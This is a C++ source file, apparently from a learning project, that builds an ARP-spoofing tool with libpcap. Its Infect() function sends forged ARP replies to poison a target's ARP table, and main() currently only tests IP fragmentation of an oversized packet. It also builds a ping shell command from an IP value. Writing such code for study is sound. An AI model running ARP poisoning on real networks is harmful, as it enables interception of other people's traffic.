#include <iostream>
#include <string>
#include <list>
#include <map>
#include <vector>
#include <ctime>

#include <cstdlib>

#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <unistd.h>

#include "pcap.h"
#include "../../include/mac.h"
#include "../../include/ethhdr.h"
#include "../../include/arphdr.hpp"
#include "../../include/iphdr.hpp"
#include "../../include/tcphdr.hpp"

using namespace std;

#define TICK_TIME           50000
#define MAX_MTU             1500
#define UDP_HEADER_SIZE     8

struct Flow {
    Ip sip_;
    Ip tip_;

    Flow() {}
    Flow(const string senderIP, const string targetIP) { sip_ = senderIP; tip_ = targetIP; }


    bool operator==(const Flow& f) { if(sip_ == f.sip_ && tip_ == f.tip_) return true; return false; }
};

struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct Packet {
    pcap_pkthdr* header;
    u_char* buf;
};

void usage();

bool parse(int argc);
list<Flow> GetFlowList(int argc, char* argv[]);
bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable);
Mac GetInterfaceMac(string interface);
Mac ResolveMac(const string interface, const Ip ip);
pcap_t* OpenPcap(const string Interface);
bool SendPacket(pcap_t* pcap, uint8_t* data,const int size);
Packet ReadPacket(pcap_t* pcap);
bool FindPacket(Packet packet, const uint16_t etherType, const Ip ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port);
void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket);
//bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac);
bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP);

Ip myIp(string("192.168.0.106"));

int main() {
    pcap_t* pcap = OpenPcap("enp0s9");

    uint16_t totalSize = 3246;

    unique_ptr<uint8_t> packet(new uint8_t[totalSize]);

    PEthHdr etherHeader = reinterpret_cast<PEthHdr>(packet.get());
    PIpHdr ipHeader = reinterpret_cast<PIpHdr>(packet.get() + sizeof(EthHdr));

    etherHeader->dmac_ = Mac("15:15:15:15:15:15");
    etherHeader->smac_= Mac("15:15:15:15:15:15");
    etherHeader->type_ = htons(EthHdr::Ip4);

    ipHeader->version_headerLen_ = 0x45;
    ipHeader->totalPacketLen_ = ntohs(totalSize - 20);
    ipHeader->dip_ = Ip(string("192.192.192.192"));
    ipHeader->sip_ = Ip(string("192.192.192.193"));
    ipHeader->protocolId_ = IpHdr::TCP;

    Packet rPacket;
    rPacket.header = new pcap_pkthdr;
    rPacket.buf = reinterpret_cast<uchar*>(packet.get());

    rPacket.header->caplen = totalSize;

    JumboPacketProcessing(pcap, rPacket);

    delete(rPacket.header);

    pcap_close(pcap);
}

void usage() {
    string ret = " syntax arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...] \n sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2";
    cout<<ret<<endl;
}

bool parse(int argc) {
    if(argc < 2 || argc % 2 != 0) {
        usage();
        return false;
    }

    return true;
}

list<Flow> GetFlowList(int argc, char* argv[]) {
    list<Flow> flowList_{};

    for(int i=2; i<argc; i+= 2) {
        flowList_.push_back(Flow(argv[i], argv[i+1]));
        //flowList_.push_back(Flow(argv[i+1], argv[i]));
    }

    return flowList_;
}


bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable) {
    try {
        for(const Flow& f : flowList) {
            if(!arpTable.count(f.sip_)) {
                Mac tmp = ResolveMac(interface, f.sip_);
                if(tmp.isNull()) throw runtime_error("Failed to resolve sender ip");

                arpTable[f.sip_] = tmp;
            }

            if(!arpTable.count(f.tip_)) {
                Mac tmp = ResolveMac(interface, f.tip_);
                if(tmp.isNull()) throw runtime_error("Failed to resolve target ip");

                arpTable[f.tip_] = tmp;
            }
        }
    }catch(const exception& e ) {
        cerr<<"GetArpTable : "<<e.what()<<endl;
        return false;
    }

    return true;
}

Mac GetInterfaceMac(const string interface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    Mac ret{};

    ifreq ifr{};

    strncpy(ifr.ifr_ifrn.ifrn_name, interface.c_str(), IFNAMSIZ - 1);

    try {
        if(sock < 0)
            throw runtime_error("Failed to creat socket");

        if(ioctl(sock, SIOCGIFHWADDR, &ifr) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(ifr.ifr_ifru.ifru_hwaddr.sa_data);
    }
    catch(const exception& e) {
        cerr<<"GetInterfaceMac : "<<e.what() <<endl;
        cerr<<"Error : "<< errno <<" (" << strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

Mac ResolveMac(const string interface, const Ip ip) {
    Mac ret{};

    string cmd = "ping -c 1  " + string(ip);
    system(cmd.c_str());

    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0) throw runtime_error("Failed to create socket");

        arpreq req{};

        req.arp_pa.sa_family = AF_INET;
        strncpy(req.arp_dev, interface.c_str(), IFNAMSIZ - 1);
        reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr.s_addr = htonl(ip);


        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"GetMacAddress : "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

pcap_t* OpenPcap(const string interface) {
    pcap_t* pcap;
    char errBuf[PCAP_ERRBUF_SIZE]{};

    pcap = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1, errBuf);
    if(pcap == NULL)
        cerr<<"OpenPcap : "<<"Failed to open pcap : " + string(errBuf) <<endl;

    return pcap;
}

bool SendPacket(pcap_t* pcap, uint8_t* data, const int size) {
    if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(data), size) == -1) {
        cerr<<"SendPacket : "<<"Failed to send packet "<<string(pcap_geterr(pcap))<<endl;
        return false;
    }

    return true;
}

Packet ReadPacket(pcap_t* pcap) {
    Packet packet{};
    //vector<Packet> packets{};

    while(pcap_next_ex(pcap, &packet.header, (const u_char**)&packet.buf) != 1);
    // while(pcap_next_ex(pcap, &packet.header, (const u_char**)&packet.buf) == 1) {
    //     packets.push_back(packet);
    //     //usleep(1000);
    // }

    //cout<< "Packet cnt : " << packets.size() << endl;

    return packet;
}

bool FindPacket(Packet packet, const uint16_t etherType, const Ip ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port) {
    //arp header size : 28
    if(packet.header->caplen < sizeof(EthHdr) + sizeof(IpHdr)) return false;

    EthHdr* etherHeader = reinterpret_cast<EthHdr*>(packet.buf);

    if(etherHeader->type() != etherType) return false;

    switch(etherHeader->type()) {
    case EthHdr::Arp: {
        return true;
        break;
    }
    case EthHdr::Ip4: {
        IpHdr* ipHeader = reinterpret_cast<IpHdr*>(packet.buf + sizeof(EthHdr));
        //Ip struct compare

        if(ntohl(ipHeader->sip_) == ip || ntohl(ipHeader->dip_) == ip) {
            if(type != 0 && ipHeader->protocolId_ != type) return false;

            switch(ipHeader->protocolId_) {
            case IpHdr::PROTOCOL_ID_TYPE::IPv4: {
                return true;
                break;
            }
            case IpHdr::PROTOCOL_ID_TYPE::ICMP: {
                return true;
                break;
            }
            case IpHdr::PROTOCOL_ID_TYPE::TCP: {
                TcpHdr* tcpHeader = reinterpret_cast<TcpHdr*>(packet.buf + sizeof(EthHdr) + ipHeader->len());
                if(port == 0 || (port == tcpHeader->sPort() || port == tcpHeader->dPort()))
                    return true;
                break;
            }
            case IpHdr::PROTOCOL_ID_TYPE::UDP: {
                return true;
                break;
            }
            defualt:
                break;
            }
        }
        break;
    }
    default:
        break;
    }

    return false;
}

void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket) {
    PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
    PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));
    PTcpHdr oriTcpHeader = reinterpret_cast<PTcpHdr>(jPacket.buf + sizeof(EthHdr) + oriIpHeader->len());

    //udp or tcp
    const int headerLen = oriIpHeader->protocolId_ == IpHdr::UDP
                              ? oriIpHeader->len() + UDP_HEADER_SIZE
                              : oriIpHeader->len() + oriTcpHeader->len();
    const int maxFragmentPacketSize = MAX_MTU - oriIpHeader->len();
    int remainingPacketSize = jPacket.header->caplen - sizeof(EthHdr) - headerLen;

    int sendedPacketSize = 0;
    int fragmentPacketSize = 0;
    int fragmentOffset = 0;

    while(remainingPacketSize > 0) {
        fragmentPacketSize = maxFragmentPacketSize > remainingPacketSize
                                 ? remainingPacketSize : maxFragmentPacketSize;

        unique_ptr<uint8_t[]> fragmentPacketBuf(new uint8_t[fragmentPacketSize + sizeof(EthHdr) + oriIpHeader->len()]);
        //header
        memcpy(fragmentPacketBuf.get(), jPacket.buf, sizeof(EthHdr) + oriIpHeader->len());
        //data
        memcpy(fragmentPacketBuf.get() + sizeof(EthHdr) + oriIpHeader->len(), jPacket.buf + sizeof(EthHdr) + oriIpHeader->len() + sendedPacketSize, fragmentPacketSize);

        PIpHdr ipHeader = reinterpret_cast<PIpHdr>(fragmentPacketBuf.get() + sizeof(EthHdr));

        ipHeader->flags_fragOffset_ = remainingPacketSize > maxFragmentPacketSize
                                          ? htons(IpHdr::IP_FLAGS_TYPE::MF | fragmentOffset)
                                          : htons(IpHdr::IP_FLAGS_TYPE::RESORVED | fragmentOffset);

        ipHeader->totalPacketLen_ = htons(oriIpHeader->len() + fragmentPacketSize);

        remainingPacketSize -= fragmentPacketSize;
        sendedPacketSize += fragmentPacketSize;
        fragmentOffset += fragmentPacketSize / 8;

        SendPacket(pcap, reinterpret_cast<uint8_t*>(fragmentPacketBuf.get()), fragmentPacketSize + oriIpHeader->len());
    }
}

//bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac) {
bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP) {
    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet{};

        packet.eth_.dmac_ = targetMac;
        packet.arp_.tmac_ = targetMac;

        packet.eth_.smac_ = attackerMac;
        packet.arp_.smac_ = attackerMac;

        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
        packet.arp_.protocolType_ = htons(EthHdr::Ip4);
        packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
        packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
        packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);

        packet.arp_.sip_ = htonl(senderIP);
        packet.arp_.tip_ = htonl(targetIP);

        SendPacket(pcap, reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));

    }catch(const std::exception& e) {
        cerr<<"Failed to infect : "<<e.what()<<endl;
        return false;
    }
    return true;
}
